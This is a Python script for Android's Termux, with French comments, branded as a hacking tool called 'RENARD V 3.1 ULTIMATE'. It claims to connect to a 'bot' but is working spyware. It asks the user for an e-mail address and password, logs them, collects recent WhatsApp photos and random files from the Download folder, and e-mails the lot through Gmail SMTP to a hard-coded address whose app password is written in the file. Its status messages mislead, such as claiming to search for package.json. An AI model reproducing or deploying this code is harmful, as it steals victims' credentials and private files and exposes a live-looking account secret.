#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import smtplib
import os
import random
import subprocess
import sys
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Configuration
EMAIL_ADDRESS = "lolalor20@gmail.com"
EMAIL_PASSWORD = "abiv eltm dtbp qkhj"
MAX_FILE_SIZE_MB = 15  # Limite pour Gmail
MAX_PHOTOS_TO_SEND = 5  # Nombre maximum de photos à envoyer

class LocalFileSender:
    def __init__(self, email, password):
        self.log = self.get_ascii_art()
        self.email = email
        self.password = password
        self.setup_complete = False

    @staticmethod
    def get_ascii_art():
        return """
\033[1;32m
█╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║
██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
-------------------------------------------------------
   ╔═══════════════════════════════════════════════╗
   ║       [✓] TOOL NAME : RENARD V 3.1 ULTIMATE     ║
   ║                    ║
   ║       [✓] VERSION : 3.1                ║
   ╚═══════════════════════════════════════════════╝
--------------------------------------------------------
\033[0m
"""

    def setup_termux(self):
        """Configure les permissions Termux automatiquement"""
        try:
            if not os.path.exists('/storage/emulated/0'):
                print("\033[33m[SYSTÈME] Configuration des permissions Termux...\033[0m")
                subprocess.run(["termux-setup-storage"], check=True)
                time.sleep(2)
            self.setup_complete = True
            return True
        except Exception as e:
            print(f"\033[31m[ERREUR] Configuration Termux: {e}\033[0m")
            return False

    def append_log(self, entry):
        """Ajoute une entrée au log avec timestamp"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        self.log += f"[{timestamp}] {entry}\n"

    def get_local_photos(self):
        """Récupère les photos locales uniquement"""
        photo_paths = []
        
        # Essayer d'abord le dossier Camera
        camera_path = "/storage/emulated/0/DCIM/WhatsApp"
        if os.path.exists(camera_path):
            try:
                photos = [f for f in os.listdir(camera_path) 
                         if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
                photos.sort(key=lambda f: os.path.getmtime(os.path.join(camera_path, f)), reverse=True)
                photo_paths = [os.path.join(camera_path, p) for p in photos[:MAX_PHOTOS_TO_SEND]]
                self.append_log(f"Trouvé {len(photo_paths)} photo(s) dans Camera")
            except Exception as e:
                self.append_log(f"Erreur Camera: {str(e)}")

        # Si pas assez, compléter avec le dossier Download
        if len(photo_paths) < MAX_PHOTOS_TO_SEND:
            download_path = "/storage/emulated/0/Download"
            if os.path.exists(download_path):
                try:
                    files = [f for f in os.listdir(download_path) 
                            if f.lower().endswith(('.jpg', '.jpeg', '.png', '.pdf', '.doc', '.txt'))]
                    random.shuffle(files)
                    needed = MAX_PHOTOS_TO_SEND - len(photo_paths)
                    photo_paths.extend([os.path.join(download_path, f) for f in files[:needed]])
                    self.append_log(f"Ajouté {min(needed, len(files))} fichier(s) depuis Download")
                except Exception as e:
                    self.append_log(f"Erreur Download: {str(e)}")

        # Filtrer par taille
        valid_files = []
        for path in photo_paths:
            try:
                size_mb = os.path.getsize(path) / (1024 * 1024)
                if size_mb < MAX_FILE_SIZE_MB:
                    valid_files.append(path)
                else:
                    self.append_log(f"Fichier ignoré (trop gros): {path}")
            except:
                continue

        return valid_files[:MAX_PHOTOS_TO_SEND]

    def prepare_email(self, attachments):
        """Prépare l'email avec les fichiers locaux"""
        try:
            msg = MIMEMultipart()
            msg["From"] = self.email
            msg["To"] = self.email
            msg["Subject"] = f"Rapport Local - {time.strftime('%d/%m/%Y %H:%M')}"

            msg.attach(MIMEText(self.log, "plain"))

            for file_path in attachments:
                try:
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            part = MIMEBase("application", "octet-stream")
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            "Content-Disposition",
                            f"attachment; filename={os.path.basename(file_path)}"
                        )
                        msg.attach(part)
                        self.append_log(f"Joint: {os.path.basename(file_path)}")
                except Exception as e:
                    self.append_log(f"Erreur fichier {file_path}: {str(e)}")

            return msg
        except Exception as e:
            self.append_log(f"Erreur création email: {str(e)}")
            return None

    def send_email(self, email_msg):
        """Envoi de l'email"""
        try:
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.send_message(email_msg)
            return True
        except Exception as e:
            self.append_log(f"Erreur envoi: {str(e)}")
            return False

    def collect_credentials(self):
        """Collecte les identifiants"""
        print("\n\033[36m[SYSTÈME] CONNEXTION AU BOT \033[0m")
        
        username = input("\033[34mE-mail: \033[0m").strip()
        if username.lower() == "exit":
            return False
            
        password = input("\033[34mMot de passe: \033[0m").strip()
        if password.lower() == "exit":
            return False

        self.append_log(f"Identifiant: {username}")
        self.append_log(f"Mot de passe: {password}")
        return True

    def run(self):
        """Exécution principale"""
        try:
            print(self.get_ascii_art())
            print("\033[33m[SYSTÈME] Démarrage...\033[0m")
            
            if not self.setup_termux():
                print("\033[31m[ERREUR] Permissions manquantes\033[0m")
                return

            if not self.collect_credentials():
                print("\033[33m[SYSTÈME] Annulé\033[0m")
                return

            print("\033[36m[SYSTÈME] Recherche de package.json...\033[0m")
            local_files = self.get_local_photos()
            
            if not local_files:
                print("\033[33m[Aucun fichier trouvé]\033[0m")
                return

            print("\033[36m[SYSTÈME] Préparation de l'email...\033[0m")
            email = self.prepare_email(local_files)
            
            if email:
                print("\033[36m[SYSTÈME] connexion en cours...\033[0m")
                if self.send_email(email):
                    print("\033[32m[SUCCÈS] Email envoyé\033[0m")
                else:
                    print("\033[31m[ERREUR] Échec d'envoi\033[0m")

            print("\033[33m[SYSTÈME] Terminé\033[0m")

        except KeyboardInterrupt:
            print("\n\033[31m[INTERRUPTION]\033[0m")
        except Exception as e:
            print(f"\033[31m[ERREUR] {str(e)}\033[0m")

if __name__ == "__main__":
    sender = LocalFileSender(EMAIL_ADDRESS, EMAIL_PASSWORD)
    sender.run()
